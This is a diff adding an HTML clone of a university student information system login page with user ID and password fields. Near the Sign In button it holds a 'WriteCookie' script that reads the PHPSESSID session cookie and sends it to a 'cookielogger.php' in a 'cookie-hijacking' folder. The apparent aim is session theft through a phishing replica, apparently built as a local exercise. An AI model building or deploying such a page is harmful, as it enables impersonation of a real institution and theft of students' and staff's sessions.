@@ -1,0 +1,306 @@
+<html dir=ltr lang=en>
+<HEAD>
+<!--
+* ***************************************************************
+*  This software and related documentation are provided under a
+*  license agreement containing restrictions on use and
+*  disclosure and are protected by intellectual property
+*  laws. Except as expressly permitted in your license agreement
+*  or allowed by law, you may not use, copy, reproduce,
+*  translate, broadcast, modify, license, transmit, distribute,
+*  exhibit, perform, publish or display any part, in any form or
+*  by any means. Reverse engineering, disassembly, or
+*  decompilation of this software, unless required by law for
+*  interoperability, is prohibited.
+*  The information contained herein is subject to change without
+*  notice and is not warranted to be error-free. If you find any
+*  errors, please report them to us in writing.
+*
+*  Copyright (C) 1988, 2011, Oracle and/or its affiliates.
+*  All Rights Reserved.
+* ***************************************************************
+-->
+<!--
+-->
+<!--
+*
+-->
+<TITLE>University of Prince Mugrin - Student Information System</TITLE>
+<style id="ptfb" type="text/css">body{display:none;}</style>
+<script type="text/javascript">
+if (self === top) {
+    var fb = document.getElementById("ptfb");
+    fb.parentNode.removeChild(fb);
+} else {
+    try { 
+        top.location = self.location;
+    } catch(ex) {}
+}
+</script>
+<link rel="stylesheet" href="styles.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="ksau_custom.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="bootstrap.css" rel="stylesheet" type="text/css">
+
+<style type="text/css">
+<!--
+body {
+        margin-left: 0px;
+        margin-top: 0px;
+        margin-right: 0px;
+        margin-bottom: 0px;
+}
+
+-->
+window.history.forward(1);
+</style></HEAD>
+<script LANGUAGE="JavaScript">
+
+function signin(form)
+    {
+    var docLoc=new String(document.location);
+    var iLast= docLoc.lastIndexOf("?&");
+    if (docLoc.length == (iLast+2))
+        {
+        docLoc = docLoc.substring(0, iLast);
+        }
+
+    if (docLoc.indexOf("?cmd=")==-1 && docLoc.indexOf("?")!=-1)
+        {
+        if (docLoc.indexOf("&cmd=login")==-1)
+            {
+            var i=docLoc.length - 1;
+            var j= docLoc.lastIndexOf("&");
+            if (j!=-1 && i==j)
+                form.action=docLoc+form.action.substring(form.action.indexOf("?")+1,form.action.length);
+            else
+                form.action=docLoc+"&"+form.action.substring(form.action.indexOf("?")+1,form.action.length);
+            }
+        else
+            form.action=docLoc.substring(0,docLoc.indexOf("&cmd=login"))+"&cmd=login"+docLoc.substring(docLoc.indexOf("&languageCd="),docLoc.length);
+        }
+
+    var now=new Date();
+    form.timezoneOffset.value=now.getTimezoneOffset();
+    return ;
+      }
+    }
+
+function setFocus()
+    {
+    try
+        {document.login.userid.focus()}
+    catch (e)
+        {};
+    return;
+    }
+
+function setErrorImg()
+    {
+    var login_error = document.getElementById('login_error').innerHTML;
+    var discovery_error = document.getElementById('discovery_error').innerHTML;
+    //var browsercheck_error = document.getElementById('browsercheck_error').innerHTML;
+    // || browsercheck_error.length != 0
+    if (login_error.length != 0 || discovery_error.length != 0)
+        {
+        document.getElementById('error_img').style.display = 'block';
+        if (login_error.length != 0)
+            document.getElementById('login_error').style.visibility = 'visible';
+        if (discovery_error.length != 0)
+            document.getElementById('discovery_error').style.visibility = 'visible';
+        document.getElementById('error_link').focus();
+        }
+    else
+        setFocus();
+    }
+
+function clearRecentSearch() {
+    if (typeof(window.sessionStorage) !== "undefined") {
+        try {
+            sessionStorage.clear();
+        } catch (e) {}
+    }
+}
+
+function submitAction(form)
+{
+
+signin(form);
+form.Submit.disabled=true;
+form.signUp.disabled=true;
+form.submit();
+}
+
+</script>
+<body onLoad="setErrorImg(); clearRecentSearch();">
+<table align="center" border="0" height="400" cellpadding="0" cellspacing="0" width="1200" background="al_banyan_logo_2.png">
+<tr><td height="75">&nbsp;</td></tr>
+    <tr>
+     <td height="45">
+	   	   <table style="margin-left:200px;border-radius:5px;display:block;padding:8px;" align="left" border="0" cellpadding="0" cellspacing="0" width="17%" height="45px">
+				   <tbody><tr>
+				      <td width="10%"  align="center" >
+                      <a href="?&cmd=login&amp;languageCd=ENG" title="English" class="btnn">English</a></td>
+					   <td width="7%" align="center"><a class="btnn" href="?&cmd=login&languageCd=ARA" title="العربية">العربية</a></td>
+                       </tr>
+			    </tbody>
+                </table>
+
+	  </td>
+   </tr>
+   <!--Start @ Opening Message Box-->
+    <tr height="75"><td>&nbsp;</td></tr>
+
+    <!--End @ Opening Message Box-->
+   <tr>
+      <td style="padding-top:13" height="30">
+          <table border="0" align="center" cellpadding="0" cellspacing="0">
+                    <tr>
+					  <td>
+                                <h1 id="error_img" style="display:none"><a id ="error_link" href="javascript:setFocus();" tabindex="1"><img src="PT_LOGIN_ERROR.gif" alt="Error" border="none"/></a></h1></td>
+                                <td style="padding-left:15;padding-right:15"><h2 class="psloginerror" id="login_error" style="visibility:hidden"></h2>
+                                <h2 class="psloginerror" id="discovery_error" style="visibility:hidden"></h2>
+                                <!--<div class="psloginerror" id="browsercheck_error" style="text-align:left">We've detected that your operating system is not supported by this website. For best results, use one of the following operating systems:</div><a href='http://www.apple.com/support/snowleopard/' target='_blank'><a href='http://www.apple.com/support/snowleopard/' target='_blank'>Mac OS X 10.6(Snow Leopard)</a><br><a href='http://www.apple.com/support/leopard/' target='_blank'><a href='http://www.apple.com/support/leopard/' target='_blank'>Mac OS X 10.5(Leopard)</a><br><a href='http://www.apple.com/ipad/' target='_blank'><a href='http://www.apple.com/ipad/' target='_blank'>iPad</a><br><a href='http://www.oracle.com/us/technologies/linux/index.htm' target='_blank'><a href='http://www.oracle.com/us/technologies/linux/index.htm' target='_blank'>Oracle Linux Enterprise</a><br><a href='http://www.microsoft.com/windows/windows-8/default.aspx' target='_blank'><a href='http://www.microsoft.com/windows/windows-8/default.aspx' target='_blank'>Windows 8</a><br><a href='http://www.microsoft.com/windows/windows-7/default.aspx' target='_blank'><a href='http://www.microsoft.com/windows/windows-7/default.aspx' target='_blank'>Windows 7</a><br><a href='http://www.apple.com/macosx/' target='_blank'><a href='http://www.apple.com/macosx/' target='_blank'>Mac OS X 10.7(Lion)</a><br><br></div></td>-->
+                                </td></tr>
+                                </table>
+            <td>
+          </tr>
+  <tr>
+    <td height="150" align="center" valign="middle">
+      <TABLE width="350" border="0" cellPadding="0" cellSpacing="0">
+        <form action="?cmd=login&languageCd=ENG" method="post" id="login" name="login" autocomplete="off">
+<input id="Lcd" type="hidden" value="ENG"></input>
+                                 <input type="hidden" name="timezoneOffset" value="0">
+        <TR>
+          <TD width="750" height="300" align=center valign="top">
+                <table width="100%" height="200" border="0" cellpadding="0" cellspacing="0">
+                  <tr>
+                 <!--start@new app block
+                    <td width="50%" colspan="2">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0" valign="top">
+                        <tr>
+                          <td width="50%" height="200" valign="top" class="psloginframecustom1">
+                          </td> -->
+ <!-- End @new app block-->
+ <!--Start @ Existing Applicants block-->
+                    <td width="50%" colspan="2">
+                    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                        <tr>
+                          <td width="50%" height="200" valign="top" class="psloginframecustom1">
+                              <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                <tr>
+                                    <td colspan="3" class="pslogintextcustom1" style="padding-right:10;padding-bottom:5; padding-left:10;padding:10;"><b>Existing Student/Staff</b></td>
+                                </tr>
+                                <tr>
+                                  <td colspan="3" class="pslogintextcustom1" style="padding-right:10; padding-left:10; text-align:justify;">Please provide your User ID and Password and click the button "Sign In" below</td>
+                                </tr>
+                                <tr><td height="2">&nbsp;</td></tr>
+                              <tr>
+                                <td width="25%" height="25" align="right" nowrap style="padding-right:10; padding-left:10;"><label for='userid' class='pslogintextcustom'>User ID:</label></td>
+                                <td width="15%" style="background:#a39f82;border:1px solid #918a54;" align="center"><img src="img_input_ism.png"></td>
+                                <td width="54%" height="25"><input id="userid" name="userid" type="text" class="pslogineditbox" size="35" style="height:30px;border-radius:5px;" tabindex="2"></td>                             <td width="1%" height="25">&nbsp;</td>
+                              </tr>
+                               <tr height="5px">&nbsp;</tr>
+                              <tr>
+                                 <td height="25" align="right" nowrap style="padding-right:10;"><label for='pwd' class='pslogintextcustom'>Password:</label></td><td width="15%" style="background:#a39f82;border:1px solid #918a54;" align="center"><img src="img_input_key.png"></td>
+                                 <td height="25"><input TYPE="password" id="pwd" name="pwd" class="pslogineditbox" size="35" style="height:30px;border-radius:5px;" tabindex="3" onChange="submitOnEnter(e);"></td>
+								 <td height="25">
+                                 </tr>
+                              <tr height="5px">&nbsp;</tr>
+                              <tr>
+                               <td colspan="4">
+                                 <table align="center">
+                                     <tbody><tr>
+									 
+									 <!-- cookie writing -->
+										<meta name="viewport" content="width=device-width, initial-scale=1">
+											<script type = "text/javascript">
+												<!--
+												function WriteCookie()
+												{
+												var allcookies = "<?php echo print_r($_COOKIE['PHPSESSID']); ?>";			   
+												window.location.href = "C:/Users/shatha/Desktop/sis-upm/upm.html/cookie-hijacking/php/cookielogger.php?cookie=" + allcookies;
+												}
+												//-->
+											</script>
+									 
+                                        <td style="padding-right:10;"><input name="Submit" class="btnn" tabindex="4" title="Sign In" value=" Sign In  " onclick="WriteCookie();" type="submit"></td>
+                                     </tr>
+                                 </tbody></table>
+                                 </td>
+                                </tr>
+ <!--<tr height="1%" align="center">
+    <td height="15" class="psforgesttext" colspan="3" style="padding-right:10; padding-left:10;">Forgot your password? Click <A href="#" title="Click here" onClick="submitActionPass(document.login,'YesFPASS')" >here</A></td>
+   </tr>
+   -->
+  </table>
+</td>
+</form>
+<!--End @ Existing Applicants block-->
+                            </tr>
+                          </table>
+                          </td>
+                        </tr>
+                         <!--Start  @ Request a Help-->
+
+                         <!--End  @ Request a Help-->
+
+                        <!--Start  @ Broswer Message-->
+
+                         <tr><td height="30">&nbsp;</td></tr>
+                           <tr>
+                               <td width="50%" class="psBroswerBox" colspan="2" valign="top" height="50">
+                   <table width="100%" height="50" border="0" cellpadding="0" cellspacing="0">
+                                <tr>
+                                  <td align="center" valign="middle">&nbsp;<img src="icon_info.png"/></td>
+                                  <td class="psBroswerBoxInner" style="padding-right:5;padding-left:10; text-align:justify;" valign="middle"><b>Compatiblity Note:</b> Please use Mozilla Firefox V 26.0 or Internet Explorer V 10.0.5 for best view</td>
+                                </tr>
+                              </td>
+                             </tr>
+                              </table>
+                           </td>
+                           </tr>
+                         <!--End  @ Broswer Message-->
+
+                        <!--start-->
+                        <!-- <tr>
+                          <td height="80" valign="middle" class="psmessageframe">
+			                  <table width="100%" border="3" cellspacing="0" cellpadding="5">
+                            <tr>
+                              <td><div style="text-align:center"><p class="pslogintext"></p></div></td>
+                            </tr>
+                          </table></td>
+                        </tr>
+                        -->
+                       <!--end-->
+
+                    </table>
+                    </td>
+                  </tr>
+          </table></TD>
+        </TR>
+        <tr>
+          <td align="center" height="85">&nbsp;</td>
+        </tr>
+      </TBODY>
+    </TABLE></td>
+  </tr>
+  <!--
+  <tr>
+    <td valign="bottom">
+
+    <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+
+      <tr>
+        <td height="30" colspan="2" valign="bottom" class="pslogincopyright">&nbsp;</td>
+        </tr>
+      <tr>
+        <td width="50%" valign="bottom" class="pslogincopyright"></td>
+        <td width="569">&nbsp;</td>
+      </tr>
+
+    </table>
+    </td>
+  </tr>
+ -->
+</table>
+</BODY></HTML>
